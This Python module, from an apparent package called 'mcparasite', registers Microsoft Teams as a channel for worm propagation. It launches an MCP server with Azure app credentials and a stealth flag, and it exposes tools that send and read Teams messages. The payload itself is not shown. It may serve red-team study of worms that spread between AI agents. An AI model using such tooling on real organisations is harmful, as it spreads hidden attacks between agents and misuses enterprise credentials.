"""Microsoft Teams propagation channel.

Uses Microsoft Graph API for message sending/reading.
Critical for enterprise environments where Teams is the primary
communication platform.
"""

from __future__ import annotations

from mcparasite.channels.base import ChannelConfig, PropagationChannel
from mcparasite.channels.registry import register_channel


@register_channel("teams")
class TeamsChannel(PropagationChannel):
    """Microsoft Teams channels as worm propagation medium."""

    def get_mcp_command(self) -> list[str]:
        cmd = ["uv", "run", "python", "mcparasite/servers/teams_mcp.py"]
        p = self.config.params
        if p.get("tenant_id"):
            cmd.extend(["--tenant", p["tenant_id"]])
        if p.get("client_id"):
            cmd.extend(["--client-id", p["client_id"]])
        if p.get("client_secret"):
            cmd.extend(["--client-secret", p["client_secret"]])
        if p.get("team_id"):
            cmd.extend(["--team", p["team_id"]])
        if p.get("channel_id"):
            cmd.extend(["--channel", p["channel_id"]])
        cmd.extend(self.get_stealth_flag())
        return cmd

    def get_server_name(self) -> str:
        return "teams"

    def get_env_vars(self) -> dict[str, str]:
        env = {}
        for key in ("tenant_id", "client_id", "client_secret"):
            if self.config.params.get(key):
                env[f"TEAMS_{key.upper()}"] = self.config.params[key]
        return env

    def get_send_tool_name(self) -> str:
        return "send_teams_message"

    def get_read_tool_name(self) -> str:
        return "read_teams_messages"

    def get_channel_description(self) -> str:
        ch = self.config.params.get("channel_name", "General")
        return f"Teams channel #{ch}"

    def validate_config(self) -> tuple[bool, str]:
        p = self.config.params
        required = ["tenant_id", "client_id", "client_secret"]
        missing = [k for k in required if not p.get(k)]
        if missing:
            return False, f"Teams requires: {', '.join(missing)} (Azure AD App Registration)."
        return True, ""
